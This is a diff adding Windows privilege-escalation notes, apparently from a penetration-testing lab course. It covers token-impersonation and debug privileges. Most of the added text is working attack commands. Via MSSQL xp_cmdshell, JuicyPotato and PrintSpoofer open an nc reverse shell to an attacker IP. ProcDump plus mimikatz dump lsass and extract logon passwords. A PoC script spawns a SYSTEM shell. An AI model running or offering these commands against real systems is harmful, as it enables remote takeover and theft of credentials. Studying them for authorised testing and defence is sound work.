@@ -60,5 +60,51 @@ DNS Admins
 `whoami /priv`
 
 # SeImpersonate and SeAssignPrimiaryToken
+To utilize the token, the SeImpersonate privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening. An example of using this token would be [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).
 
+### Impacket-mssqlclient.py (SeImpersonatePrivilege)
+[JuicyPotato](https://github.com/ohpe/juicy-potato)
+```SQL
+mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+enable_xp_cmdshell
+xp_cmdshell whoami
+xp_cmdshell whoami /priv
+xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
 
+sudo nc -lnvp 8443
+```
+
+# PrintSpoofer and RougePotato
+[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RougePotato](https://github.com/antonioCoco/RoguePotato)
+
+```SQL
+xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+nc -lnvp 8443
+```
+
+# SeDebugPrivilege
+Where to find the settings:
+
+`Computer Settings > Windows Settings > Security Settings.`
+
+`User Rights Assignment > Debug Programs`
+
+### Using the command line
+[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
+
+```cmd
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+mimikatz.exe
+log
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+If RDP'd into a system, can go to the task manager and find the lsass.exe and make a dump file to move back to the kali machine for evidence.
+
+### Remote Code Execution
+
+We can also leverage SeDebugPrivilege for RCE. Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it. 
+First, transfer this [PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) script over to the target system. Next we just load the script and run it with the following syntax `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,c:\Windows\System32\cmd.exe","")`. Note that we must add a third blank argument "" at the end for the PoC to work properly.
+
+To get the pid, run a `tasklist` command.
